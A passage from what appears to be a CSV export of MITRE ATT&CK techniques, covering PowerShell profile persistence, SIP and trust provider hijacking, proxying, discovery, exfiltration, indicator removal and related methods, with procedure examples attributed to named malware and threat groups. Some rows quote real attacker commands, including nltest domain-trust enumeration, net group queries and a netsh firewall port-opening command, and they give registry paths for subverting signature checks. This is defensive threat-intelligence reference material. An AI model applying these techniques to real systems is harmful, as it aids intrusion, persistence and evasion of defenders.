ipconfig.', '[Frankenstein] has enumerated hosts, looking for the public IP address of the system.', '[Dragonfly 2.0] used batch scripts to enumerate network information, including information about trusts, zones, and the domain.', '[Cobalt Strike] can determine the IP addresses of domain controllers.']",False
T1504,PowerShell Profile,"Adversaries may gain persistence and elevate privileges in certain situations by abusing [PowerShell] profiles. A PowerShell profile  (<code>profile.ps1</code>) is a script that runs when PowerShell starts and can be used as a logon script to customize user environments. PowerShell supports several profiles depending on the user or host program. For example, there can be different profiles for PowerShell host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer.    Adversaries may modify these profiles to include arbitrary commands, functions, modules, and/or PowerShell drives to gain persistence. Every time a user opens a PowerShell session the modified script will be executed unless the <code>-NoProfile</code> flag is used when it is launched.    An adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. ",[],True
T1198,SIP and Trust Provider Hijacking,"In user mode, Windows Authenticode  digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,   which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature.   Because of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs)  to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  ) and are identified by globally unique identifiers (GUIDs).   Similar to [Code Signing] adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and whitelisting tools to classify malicious (or any) code as signed by:   * Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\SOFTWARE[\WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{SIP_GUID}</code> that point to the dynamic link library (DLL) providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file’s real signature, an adversary can apply an acceptable signature value to all files using that SIP  (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file). * Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{SIP_GUID}</code> that point to the DLL providing a SIP’s CryptSIPDllVerifyIndirectData function, which validates a file’s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP  (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk. * Modifying the <code>DLL</code> and <code>Function</code> Registry values in <code>HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\Providers\Trust\FinalPolicy\{trust provider GUID}</code> that point to the DLL providing a trust provider’s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP’s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex). * **Note:** The above hijacks are also possible without modifying the Registry via [DLL Search Order Hijacking]  Hijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. ",[],True
T1087,Account Discovery,"Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., [Valid Accounts]  Adversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment.  For examples, cloud environments typically provide easily accessible interfaces to obtain user lists. On hosts, adversaries can use default [PowerShell] and other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected system’s files.","['[ShimRatReporter] listed all non-privileged and privileged accounts available on the machine.', '[Woody RAT] can identify administrator accounts on an infected machine.', ""[XCSSET] attempts to discover accounts from various locations such as a user's Evernote, AppleID, Telegram, Skype, and WeChat data."", 'During the [SolarWinds Compromise] [APT29] obtained a list of users and their roles from an Exchange server using `Get-ManagementRoleAssignment`.', ""[FIN13] has enumerated all users and their roles from a victim's main treasury system."", '[APT29] obtained a list of users and their roles from an Exchange server using <code>Get-ManagementRoleAssignment</code>.', '[UNC2452] obtained a list of users and their roles from an Exchange server using <code>Get-ManagementRoleAssignment</code>.', '[APT32] enumerated administrative users and DC servers using the commands <code>net localgroup administrators</code> and <code>net group ""Domain Controllers"" /domain</code>.']",False
T1090,Proxy,"Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN] ZXProxy, and ZXPortMap.  Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.  Adversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.","['[NETWIRE] can implement use of proxies to pivot traffic.', '[ZIPLINE] can create a proxy server on compromised hosts.', '[KOCTOPUS] has deployed a modified version of Invoke-Ngrok to expose open local ports to the Internet.', '[Volt Typhoon] has used compromised devices and customized versions of open source tools  such as Fast Reverse Proxy (FRP), Earthworm, and [Impacket] to proxy network traffic.', '[SDBbot] has the ability to use port forwarding to establish a proxy between a target host and C2.', '[SombRAT] has the ability to use an embedded SOCKS proxy in C2 communications.', '[HTRAN] can proxy TCP socket connections to obfuscate command and control infrastructure.', '[Sandworm Team] BCS-server tool can create an internal proxy server to redirect traffic from the adversary-controlled C2 to internal servers which may not be connected to the internet, but are interconnected locally.\t', '[AuditCred] can utilize proxy for communications.', '[ZxShell] can set up an HTTP or SOCKS proxy. ', '[Turla] RPC backdoors have included local UPnP RPC proxies.\t', '[HOPLIGHT] has multiple proxy options that mask traffic between the malware and the remote operators.\t ', '[CopyKittens] has used the AirVPN service for operational activity.', '[WarzoneRAT] has the capability to act as a reverse proxy.', '[ngrok] can be used to proxy connections to machines located behind NAT or firewalls.', '[LITTLELAMB.WOOLTEA] has the ability to function as a SOCKS proxy.', '[LAPSUS$] has leverage NordVPN for its egress points when targeting intended victims.', '[Blue Mockingbird] has used frp, ssf, and Venom to establish SOCKS proxy connections.', '[Cinnamon Tempest] has used a customized version of the Iox port-forwarding and proxy tool.', '[Remcos] uses the infected hosts as SOCKS5 proxies to allow for tunneling and proxying.', '[BADCALL] functions as a proxy server between the victim and C2 server.', '[BADHATCH] can use SOCKS4 and SOCKS5 proxies to connect to actor-controlled C2 servers. [BADHATCH] can also emulate a reverse proxy on a compromised machine to connect with actor-controlled C2 servers.', '[netsh] can be used to set up a proxy tunnel to allow remote host access to an infected host.', '[MoustachedBouncer] has used a reverse proxy tool similar to the GitHub repository revsocks.', '[PLEAD] has the ability to proxy network communications.', ""[Dridex] contains a backconnect module for tunneling network traffic through a victim's computer. Infected computers become part of a P2P botnet that can relay C2 traffic to other infected peers. "", '[HARDRAIN] uses the command <code>cmd.exe /c netsh firewall add portopening TCP 443 ""adp""</code> and makes the victim machine function as a proxy server.', '[Kessel] can use a proxy during exfiltration if set in the configuration.', '[TSCookie] has the ability to proxy communications with command and control (C2) servers.', '[Windigo] has delivered a generic Windows proxy Win32/Glubteta.M. [Windigo] has also used multiple reverse proxy chains as part of their C2 infrastructure.', '[POLONIUM] has used the AirVPN service for operational activity.', '[PoshC2] contains modules that allow for use of proxies in command and control.', 'A [TYPEFRAME] variant can force the compromised system to function as a proxy server.', 'During [C0017] [APT41] used the Cloudflare CDN to proxy C2 traffic.', '[jRAT] can serve as a SOCKS proxy server.', '[Green Lambert] can use proxies for C2 traffic.', '[FunnyDream] can identify and use configured proxies in a compromised network for C2 communication.', 'During [Operation Wocao] threat actors used a custom proxy tool called ""Agent"" which has support for multiple hops.', '[RainyDay] can use proxy tools including boost_proxy_client for reverse proxy functionality.', '[Cardinal RAT] can act as a reverse proxy.', '[Socksbot] can start SOCKS proxy threads.', '[Fox Kitten] has used the open source reverse proxy tools including FRPC and Go Proxy to establish connections from C2 to local servers.', '[Vasport] is capable of tunneling though a proxy.', '[QuasarRAT] can communicate over a reverse proxy using SOCKS5.', '[Earth Lusca] adopted Cloudflare as a proxy for compromised servers.', '[Magic Hound] has used Fast Reverse Proxy (FRP) for RDP traffic.', '[Ursnif] has used a peer-to-peer (P2P) network for C2.', '[Aria-body] has the ability to use a reverse SOCKS proxy module.', '[Bisonal] has supported use of a proxy server.', '[APT41] used a tool called CLASSFON to covertly proxy network communications.', '[XTunnel] relays traffic between a C2 server and a victim.', '[Samurai] has the ability to proxy connections to specified remote IPs and ports through a a proxy module.', '[KEYPLUG] has used Cloudflare CDN associated infrastructure to redirect C2 communications to malicious domains.', 'During [C0027] [Scattered Spider] installed the open-source rsocx reverse proxy tool on a targeted ESXi appliance.', 'For [Operation Sharpshooter] the threat actors used the ExpressVPN service to hide their location.', '[Ngrok] can be used to proxy connections to machines located behind NAT or firewalls.', '[Operation Wocao] has used a custom proxy tool called ""Agent"" which has support for multiple hops.', '[Wizard Spider] has used a module named NewBCtestnDll64 as a reverse SOCKS proxy.', '[Gazer] identifies a proxy server if it exists and uses it to make HTTP requests.', '[FLIPSIDE] is a simple proxy that creates an outbound RDP connection.']",
T1059,Command and Scripting Interpreter,"Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell] while Windows installations include the [Windows Command Shell] and [PowerShell]  There are also cross-platform interpreters such as [Python] as well as those commonly associated with client applications such as [JavaScript] and [Visual Basic]  Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access] payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services] in order to achieve remote Execution.","['[Fox Kitten] has used a Perl reverse shell to communicate with C2.', '[Stealth Falcon] malware uses WMI to script data collection and command execution on the victim.', ""[FIN7] used SQL scripts to help perform tasks on the victim's machine."", '[DarkComet] can execute various types of scripts on the victim’s machine.', '[FIN6] has used scripting to iterate through a list of compromised PoS systems, copy data to a log file, and remove the original data files.', 'For [Operation Spalax] the threat actors used Nullsoft Scriptable Install System (NSIS) scripts to install malware.', '[CHOPSTICK] is capable of performing remote command execution.', '[Donut] can generate shellcode outputs that execute via Ruby.\t', '[FIVEHANDS] can receive a command line argument to limit file encryption to specified directories.', '[FIN5] scans processes on all victim systems in the environment and uses automated scripts to pull back the results.', '[Matryoshka] is capable of providing Meterpreter shell access.', '[Imminent Monitor] has a CommandPromptPacket and ScriptPacket module(s) for creating a remote shell and executing scripts.', '[Kessel] can create a reverse shell between the infected host and a specified system.\t', 'During [Cutting Edge] threat actors used Perl scripts to enable the deployment of the THINSPOOL shell script dropper and for enumerating host data.', '[APT19] downloaded and launched code within a SCT file.', '[gh0st RAT] is able to open a remote shell to execute commands.', '[APT32] has used COM scriptlets to download Cobalt Strike beacons.\t', '[Dragonfly] has used the command line for execution.', '[P.A.S. Webshell] has the ability to create reverse shells with Perl scripts.', '[WINERACK] can create a reverse shell that utilizes statically-linked Wine cmd.exe code to emulate Windows command prompt commands.', '[SLIGHTPULSE] contains functionality to execute arbitrary commands passed to it.', '[Bandook] can support commands to execute Java-based payloads. ', '[Whitefly] has used a simple remote shell tool that will call back to the C2 server and wait for commands.', '[Zeus Panda] can launch remote scripts on the victim’s machine.\t', '[SpeakUp] uses Perl scripts.', '[APT39] has utilized custom scripts to perform internal reconnaissance.', 'Malware used by [Ke3chang] can run commands on the command-line interface.', '[APT37] has used Ruby scripts to execute payloads.', '[Windigo] has used a Perl script for information gathering.', '[Get2] has the ability to run executables with command-line arguments.', '[PoetRAT] has executed a Lua script through a Lua interpreter for Windows.', '[OilRig] has used various types of scripting for execution.', '[Empire] uses a command-line interface to interact with systems.', '[Bonadan] can create bind and reverse shells on the infected system.\t', '[Dragonfly 2.0] used command line for execution.', '[Molerats] used various implants, including those built on .NET, on target machines.\t', '[Exaramel for Windows] has a command to launch a remote shell and executes commands on the victim’s machine.', '[OilRig] has used the command-line interface for execution.', '[BRONZE BUTLER] uses the command-line interface.', 'Several commands are supported by the [Honeybee] implant via the command-line interface and there’s also a utility to execute any custom command on an infected endpoint.', '[FELIXROOT] opens a remote shell to execute commands on the infected system.', '[Denis] can launch a remote shell to execute arbitrary commands on the victim’s machine.', '[APT28] uses cmd.exe to execute commands and custom backdoors.', '[FIN8] executes commands remotely via cmd.exe.', '[MoonWind] can execute commands via an interactive command shell.', '[OSX_OCEANLOTUS.D] can run commands through a terminal on the victim’s machine.', '[TYPEFRAME] can execute commands using a shell.', '[APT1] has used the Windows command shell to execute commands.', '[Lazarus Group] malware uses cmd.exe to execute commands on victims.', ' [Astaroth] spawns a CMD process to execute commands.', '[Emotet] has used cmd.exe to run a PowerShell script.', '[DarkComet] can launch a remote shell to execute commands on the victim’s machine.', '[Cobalt Group] has used a JavaScript backdoor that is capable of launching cmd.exe to execute shell commands.', 'creates a backdoor through which remote attackers can open a command-line interface.', 'APT34 has used the command-line interface for execution.']",False
T1482,Domain Trust Discovery,"Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain. Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct [SID-History Injection] [Pass the Ticket] and [Kerberoasting] Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP. The Windows utility [Nltest] is known to be used by adversaries to enumerate domain trusts.","['[Empire] has modules for enumerating domain trusts.', '[Bazar] can use [Nltest] tools to obtain information about the domain.', '[AdFind] can gather information about organizational units (OUs) and domain trusts from Active Directory.', '[Rubeus] can gather information about domain trusts.', '[Akira] uses the built-in [Nltest] utility or tools such as [AdFind] to enumerate Active Directory trusts in victim environments. ', '[Chimera] has <code>nltest /domain_trusts</code> to identify domain trust relationships.', '[SocGholish] can profile compromised systems to identify domain trust relationships.', '[Nltest] may be used to enumerate trusted domains by using commands such as <code>nltest /domain_trusts</code>.', '[QakBot] can run <code>nltest /domain_trusts /all_trusts</code> for domain trust discovery.', '[Earth Lusca] has used [Nltest] to obtain information about domain controllers.', '[Brute Ratel C4] can use LDAP queries and `nltest /domain_trusts` for domain trust discovery.', '[BloodHound] has the ability to map domain trusts and identify misconfigurations for potential abuse.', '[BADHATCH] can use `nltest.exe /domain_trusts` to discover domain trust relationships on a compromised machine.', '[PoshC2] has modules for enumerating domain trusts.', 'During the [SolarWinds Compromise] [APT29] used the `Get-AcceptedDomain` PowerShell cmdlet to enumerate accepted domains through an Exchange Management Shell. They also used [AdFind] to enumerate domains and to discover trust between federated domains.', '[Magic Hound] has used a web shell to execute `nltest /trusted_domains` to identify trust relationships.', '[dsquery] can be used to gather information on domain trusts with <code>dsquery * -filter ""(objectClass=trustedDomain)"" -attr *</code>.', '[PowerSploit] has modules such as <code>Get-NetDomainTrust</code> and <code>Get-NetForestTrust</code> to enumerate domain and forest trusts.', '[TrickBot] can gather information about domain trusts by utilizing [Nltest]', '[FIN8] has retrieved a list of trusted domains by using <code>nltest.exe /domain_trusts</code>.', 'During [C0015] the threat actors used the command `nltest /domain_trusts /all_trusts` to enumerate domain trusts.', '[APT29] used the <code>Get-AcceptedDomain</code> PowerShell cmdlet to enumerate accepted domains through an Exchange Management Shell. They also used [AdFind] to enumerate domains and to discover trust between federated domains.', '[UNC2452] used the <code>Get-AcceptedDomain</code> PowerShell cmdlet to enumerate accepted domains through an Exchange Management Shell. They also used [AdFind] to enumerate domains and to discover trust between federated domains.', '[Wizard Spider] has used <code>AdFind.exe</code> to collect information about Active Directory organizational units and trust objects.']",False
T1175,Component Object Model and Distributed COM,"**This technique has been deprecated. Please use [Distributed Component Object Model] and [Component Object Model]  Adversaries may use the Windows Component Object Model (COM) and Distributed Component Object Model (DCOM) for local code execution or to execute on remote systems as part of lateral movement.   COM is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). DCOM is transparent middleware that extends the functionality of Component Object Model (COM)  beyond a local computer using remote procedure call (RPC) technology.  Permissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.  By default, only Administrators may remotely activate and launch COM objects through DCOM.  Adversaries may abuse COM for local command and/or payload execution. Various COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and VBScript. Specific COM objects also exists to directly perform functions beyond code execution, such as creating a [Scheduled Task/Job] fileless download/execution, and other adversary behaviors such as Privilege Escalation and Persistence.  Adversaries may use DCOM for lateral movement. Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications  as well as other Windows objects that contain insecure methods. DCOM can also execute macros in existing documents  and may also invoke [Dynamic Data Exchange] (DDE) execution directly through a COM created instance of a Microsoft Office application , bypassing the need for a malicious document.",[],False
T1020,Automated Exfiltration,"Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection.   When automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel] and [Exfiltration Over Alternative Protocol]","['[StrongPity] can automatically exfiltrate collected documents to the C2 server.', '[LightNeuron] can be configured to automatically exfiltrate files under a specified directory.', ""During [Frankenstein] the threat actors collected information via [Empire] which was automatically sent back to the adversary's C2."", '[Sidewinder] has configured tools to automatically send collected files to attacker controlled servers.', ""[Empire] has the ability to automatically send collected data back to the threat actors' C2."", '[Doki] has used a script that gathers information from a hardcoded list of IP addresses and uploads to an Ngrok URL.', '[Rover] automatically searches for files on local drives based on a predefined list of file extensions and sends them to the command and control server every 60 minutes. [Rover] also automatically sends keylogger files and screenshots to the C2 server on a regular timeframe.', '[OutSteel] can automatically upload collected files to its C2 server.', '[Peppy] has the ability to automatically exfiltrate files and keylogs.', '[Machete] collected files are exfiltrated automatically to remote servers. ', '[Ebury] can automatically exfiltrate gathered SSH credentials.', '[Ke3chang] has performed  frequent and scheduled data exfiltration from compromised networks.', '[TajMahal] has the ability to manage an automated queue of egress files and commands sent to its C2.', '[USBStealer] automatically exfiltrates collected files via removable media when an infected device connects to an air-gapped victim machine after initially being connected to an internet-enabled victim machine. ', '[Crutch] has automatically exfiltrated stolen files to Dropbox.', '[Tropic Trooper] has used a copy function to automatically exfiltrate sensitive data from air-gapped systems using USB storage.\t', '[Gamaredon Group] has used modules that automatically upload gathered documents to the C2 server.', '[ShimRatReporter] sent collected system and network information compiled into a report to an adversary-controlled C2.', '[CosmicDuke] exfiltrates collected files automatically over FTP to remote servers.', '[Attor] has a file uploader plugin that automatically exfiltrates the collected data and log files to the C2 server.', 'When a document is found matching one of the extensions in the configuration, [TINYTYPHON] uploads it to the C2 server.', ""[Frankenstein] has collected information via [Empire] which is automatically sent the data back to the adversary's C2."", '[Honeybee] performs data exfiltration is accomplished through the following command-line command: <code>from <COMPUTER-NAME> (<Month>-<Day> <Hour>-<Minute>-<Second>).txt</code>.']",False
T1070,Indicator Removal,"Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary’s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.  Removal of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.","['[Donut] can erase file references to payloads in-memory after being reflectively loaded and executed.', '[SDBbot] has the ability to clean up and remove data structures from a compromised host.', '[ShadowPad] has deleted arbitrary Registry values.', '[BlackEnergy] has removed the watermark associated with enabling the <code>TESTSIGNING</code> boot configuration option by removing the relevant strings in the <code>user32.dll.mui</code> of the system.', '[EVILNUM] has a function called ""DeleteLeftovers"" to remove certain artifacts of the attack.', '[SILENTTRINITY] can remove artifacts from the compromised host, including created Registry keys.', 'During [Cutting Edge] threat actors cleared logs to remove traces of their activity and restored compromised systems to a clean state to bypass manufacturer mitigations for CVE-2023-46805 and CVE-2024-21887.', '[Orz] can overwrite Registry settings to reduce its visibility on the victim.', '[HermeticWiper] can disable pop-up information about folders and desktop items and delete Registry keys to hide malicious services.', '[Metamorfo] has a command to delete a Registry key it uses, <code>\\Software\\Microsoft\\Internet Explorer\\notes</code>.', '[Stuxnet] can delete OLE Automation and SQL stored procedures used to store malicious payloads.', '[Rising Sun] can clear a memory blog in the process by overwriting it with junk bytes.\t', '[APT5] has used the THINBLOOD utility to clear SSL VPN log files located at `/home/runtime/logs`.', '[FunnyDream] has the ability to clean traces of malware deployment.', '[Sardonic] has the ability to delete created WMI objects to evade detections.', 'During the [SolarWinds Compromise] [APT29] temporarily replaced legitimate utilities with their own, executed their payload, and then restored the original file.', '[Lazarus Group] has restored malicious [KernelCallbackTable] code to its original state after the process execution flow has been hijacked.', '[Maze] has used the “Wow64RevertWow64FsRedirection” function following attempts to delete the shadow volumes, in order to leave the system in the same state as it was prior to redirection.\t', '[Sibot] will delete an associated registry key if a certain server response is received.', '[CSPY Downloader] has the ability to remove values it writes to the Registry.', '[Bankshot] deletes all artifacts associated with the malware from the infected machine.', '[Flagpro] can close specific Windows Security and Internet Explorer dialog boxes to mask external connections.', '[DarkWatchman] can uninstall malicious components from the Registry, stop processes, and clear the browser history.', '[SUNBURST] removed HTTP proxy registry values to clean up traces of execution.', '[Neoichor] can clear the browser history on a compromised host by changing the `ClearBrowsingHistoryOnExit` value to 1 in the `HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Privacy` Registry key.  ', '[S-Type] has deleted accounts it has created.', '[APT29] temporarily replaced legitimate utilities with their own, executed their payload, and then restored the original file.', '[UNC2452] removed evidence of email export requests using <code>Remove-MailboxExportRequest</code>. They temporarily replaced legitimate utilities with their own, executed their payload, and then restored the original file.', '[KOCTOPUS] can delete created registry keys as part of its cleanup procedure.', '[Metamorfo] has a command to delete a Registry key it uses, <code>\\Software\\Microsoft\\Internet Explorer\\notes</code>. ', '[GrimAgent] can delete previously created tasks on a compromised host.', '[MCMD] has the ability to remove set Registry Keys.', '[Goopy] has the ability to delete emails used for C2 once the content has been copied.\t', '[CSPY Downloader] has the ability to remove values it writes to the Registry.', '[ShadowPad] has deleted arbitrary Registry values.', '[Bazar] loader can delete scheduled tasks created by a previous instance of the malware.\t', '[RTM] has the ability to remove Registry entries that it created during execution.', '[Sibot] will delete an associated registry key if a certain server response is received.', '[Pillowmint] can uninstall the malicious service from an infected machine.', '[Misdat] is capable of deleting Registry keys used for persistence.', '[njRAT] is capable of manipulating and deleting registry keys.', '[Stuxnet] removes itself from the system through a DLL export by deleting specific files and stored procedures.', '[Zeus Panda] can uninstall scripts and delete files to cover its track.', '[APT29] used [SDelete] to remove artifacts from victims.', 'Dragonfly deleted system, security, terminal services, remote services, and audit logs from a victim.']",False
T1609,Container Administration Command,"Adversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.  In Docker, adversaries may specify an entrypoint during container deployment that executes a script or command, or they may use a command such as <code>docker exec</code> to execute a command within a running container. In Kubernetes, if an adversary has sufficient permissions, they may gain remote execution in a container in the cluster via interaction with the Kubernetes API server, the kubelet, or by running a command such as <code>kubectl exec</code>.","['[TeamTNT] executed [Hildegard] through the kubelet API run command and by executing commands on running containers.', '[Peirates] can use `kubectl` or the Kubernetes API to run commands.', '[Hildegard] was executed through the kubelet API run command and by executing commands on running containers.', '[Siloscape] can send kubectl commands to victim clusters through an IRC channel and can run kubectl locally to spread once within a victim cluster.', '[Kinsing] was executed with an Ubuntu container entry point that runs shell scripts.']",False
T1083,File and Directory Discovery,"Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery] during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.  Many command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the [Native API] Adversaries may also leverage a [Network Device CLI] on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).  Some files and directories may require elevated or specific user permissions to access.","['[BLACKCOFFEE] has the capability to enumerate files.', '[Orz] can gather victim drive information.', '[Attor] has a plugin that enumerates files with specific extensions on all hard disk drives and stores file information in encrypted log files.', '[USBStealer] searches victim drives for files matching certain extensions (“.skr”,“.pkr” or “.key”) or names.', '[SDBbot] has the ability to get directory listings or drive information on a compromised host.', '[Kinsing] has used the find command to search for specific files.', '[Amadey] has searched for folders associated with antivirus software.', '[Woody RAT] can list all files and their associated attributes, including filename, type, owner, creation time, last access time, last write time, size, and permissions. ', '[Ebury] can list directory entries. ', '[PlugX] has a module to enumerate drives and find files recursively.', '[Akira] examines files prior to encryption to determine if they meet requirements for encryption and can be encrypted by the ransomware. These checks are performed through native Windows functions such as <code>GetFileAttributesW</code>.', '[Volgmer] can list directories on a victim.', '[P.A.S. Webshell] has the ability to list files and file characteristics including extension, size, ownership, and permissions.', ""[Bazar] can enumerate the victim's desktop."", '[Crimson] contains commands to list files and directories, as well as search for files matching certain extensions from a defined list.', '[SynAck] checks its directory location in an attempt to avoid launching in a sandbox.', 'A [Patchwork] payload has searched all fixed drives on the victim for files matching a specified list of extensions.', '[Sowbug] identified and extracted all Word documents on a server by using a command containing * .doc and *.docx. The actors also searched for documents based on a specific date range and attempted to identify all installed software on a victim.', '[yty] gathers information on victim’s drives and has a plugin for document listing.', '[TAINTEDSCRIBE] can use <code>DirectoryList</code> to enumerate files in a specified directory.', '[ELMER] is capable of performing directory listings.', '[SUGARDUMP] can search for and collect data from specific Chrome, Opera, Microsoft Edge, and Firefox files, including any folders that have the string `Profile` in its name.', 'During [C0015] the threat actors conducted a file listing discovery against multiple hosts to ensure locker encryption was successful.', '[Fysbis] has the ability to search for files. ', '[Remsec] is capable of listing contents of folders on the victim. [Remsec] also searches for custom network encryption software on victims.', '[KillDisk] has used the <code>FindNextFile</code> command as part of its file deletion process.', 'During [Operation Honeybee] the threat actors used a malicious DLL to search for files with specific keywords.', '[WinMM] sets a WH_CBT Windows hook to search for and capture files on the victim.', '[Gamaredon Group] macros can scan for Microsoft Word and Excel files to inject with additional malicious macros. [Gamaredon Group] has also used its backdoors to automatically list interesting files (such as Office documents) found on a system.\t', '[Turian] can search for specific files and list directories.', '[POORAIM] can conduct file browsing.', ""[Micropsia] can perform a recursive directory listing for all volume drives available on the victim's machine and can also fetch specific files by their paths."", '[Misdat] is capable of running commands to obtain a list of files and directories, as well as enumerating logical drives.', '[Winnti for Windows] can check for the presence of specific files prior to moving to the next phase of execution.', ""[GeminiDuke] collects information from the victim, including installed drivers, programs previously executed by users, programs and services configured to automatically run at startup, files and folders present in any user's home folder, files and folders present in any user's My Documents, programs installed to the Program Files folder, and recently accessed files, folders, and programs."", '[BoxCaon] has searched for files on the system, such as documents located in the desktop folder.', 'During [Operation CuckooBees] the threat actors used `dir c:\\\\` to search for files.', '[njRAT] can browse file systems using a file manager module.', '[PinchDuke] searches for files created within a certain timeframe and whose file extension matches a predefined list.', '[WindTail] has the ability to enumerate the users home directory and the path to its own application bundle.', '[Dragonfly] has used a batch script to gather folder and file names from victim hosts.', '[AuditCred] can search through folders and files on the system.', '[Diavol] has a command to traverse the files and directories in a given path. ', '[Sliver] can enumerate files on a target system.', '[PowerDuke] has commands to get the current directory name as well as the size of a file. It also has commands to obtain information about logical drives, drive type, and free space.', '[BackConfig] has the ability to identify folders and files related to previous infections.\t', ""[Bankshot] searches for files on the victim's machine."", '[PingPull] can enumerate storage volumes and folder contents of a compromised host.', '[4H RAT] has the capability to obtain file and directory listings.', '[FALLCHILL] can search files on a victim.', '[MarkiRAT] can look for files carrying specific extensions such as: .rtf, .doc, .docx, .xls, .xlsx, .ppt, .pptx, .pps, .ppsx, .txt, .gpg, .pkr, .kdbx, .key, and .jpb.', '[Epic] recursively searches for all .doc files on the system and collects a directory listing of the Desktop, %TEMP%, and %WINDOWS%\\Temp directories.', '[Clambling] can browse directories on a compromised host.', '[down_new] has the ability to list the directories on a compromised host.', '[Ryuk] has enumerated files and folders on all mounted drives.\t', '[QakBot] can identify whether it has been run previously on a host by checking for a specified folder.', '[PoetRAT] has the ability to list files upon receiving the <code>ls</code> command from C2.', '[WhisperGate] can locate files based on hardcoded file extensions.', '[cmd] can be used to find files and directories with native functionality such as <code>dir</code> commands.', '[Seasalt] has the capability to identify the drive type on a victim.', '[APT38] have enumerated files and directories, or searched in specific locations within a compromised host.', '[APT28] has used [Forfiles] to locate PDF, Excel, and Word documents during collection. The group also searched a compromised DCCC computer for specific terms.', '[KEYMARBLE] has a command to search for files on the victim’s machine.', '[SHOTPUT] has a command to obtain 